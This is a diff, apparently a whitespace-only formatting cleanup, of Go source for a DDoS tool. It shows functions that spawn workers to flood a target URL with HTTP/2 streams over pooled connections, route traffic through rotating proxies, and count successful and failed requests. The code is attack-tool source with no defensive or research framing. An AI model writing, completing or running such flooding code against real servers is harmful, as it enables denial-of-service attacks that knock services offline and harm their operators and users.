@@ -43,7 +43,6 @@ func (d *DDoSAttack) startHTTP2StreamFloodWorkers(numWorkers int) {
 	}
 }
 
-
 // http2StreamFloodWorkerWithPool floods server with HTTP/2 streams using connection pool
 func (d *DDoSAttack) http2StreamFloodWorkerWithPool(pool *ClientPool, targetURL string) {
 	defer func() {
@@ -88,7 +87,7 @@ func (d *DDoSAttack) http2StreamFloodWorkerWithPool(pool *ClientPool, targetURL 
 				wg.Add(1)
 				limiter.Execute(func() {
 					defer wg.Done()
-					
+
 					// Recover from panics in stream goroutines
 					defer func() {
 						if r := recover(); r != nil {
@@ -105,14 +104,14 @@ func (d *DDoSAttack) http2StreamFloodWorkerWithPool(pool *ClientPool, targetURL 
 					if d.requestBuilder == nil {
 						d.requestBuilder = NewRequestBuilder(d.config)
 					}
-					
+
 					// Safe type assertion
 					rb, ok := d.requestBuilder.(*RequestBuilder)
 					if !ok || rb == nil {
 						atomic.AddInt64(&d.requestsFailed, 1)
 						return
 					}
-					
+
 					req, err := rb.BuildRequest()
 					if err != nil {
 						atomic.AddInt64(&d.requestsFailed, 1)
@@ -141,7 +140,6 @@ func (d *DDoSAttack) http2StreamFloodWorkerWithPool(pool *ClientPool, targetURL 
 	}
 }
 
-
 // sendHTTP2StreamRequestWithClient sends a request using the provided client (for pool-based workers)
 func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *http.Request, proxyURL string) bool {
 	atomic.AddInt64(&d.activeConns, 1)
@@ -154,7 +152,7 @@ func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *
 
 	resp, err := client.Do(req)
 	responseTime := time.Since(startTime)
-	
+
 	if err != nil {
 		atomic.AddInt64(&d.requestsFailed, 1)
 		if proxyURL != "" {
@@ -169,11 +167,10 @@ func (d *DDoSAttack) sendHTTP2StreamRequestWithClient(client *http.Client, req *
 
 	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
 	atomic.AddInt64(&d.requestsSuccess, 1)
-	
+
 	if proxyURL != "" {
 		d.markProxySuccess(proxyURL, responseTime)
 	}
 
 	return true
 }
-
